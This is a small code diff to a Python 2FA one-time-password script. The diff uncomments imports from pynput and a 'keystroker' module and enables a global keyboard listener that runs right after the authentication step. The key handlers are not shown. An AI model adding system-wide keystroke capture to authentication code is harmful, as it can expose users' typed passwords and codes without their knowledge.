@@ -1,5 +1,5 @@
-#from keystroker import on_press, on_release
-#from pynput import keyboard
+from keystroker import on_press, on_release
+from pynput import keyboard
 
 # ================================
 # SECTION 1: 2FA OTP Generation and Verification
@@ -37,10 +37,10 @@ def two_factor_auth():
 # ================================
 # SECTION 2: Keystroke Listener
 # ================================
-#def start_keystroke_listener():
- #   """Starts the keyboard listener."""
-  #  with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-   #     listener.join() 
+def start_keystroke_listener():
+    """Starts the keyboard listener."""
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join() 
 
 # ================================
 # MAIN FUNCTION
@@ -52,7 +52,7 @@ def main():
     two_factor_auth()
 
     # Start the keyboard listener (if needed)
-   # start_keystroke_listener()
+    start_keystroke_listener()
 
 if __name__ == "__main__":
     main()
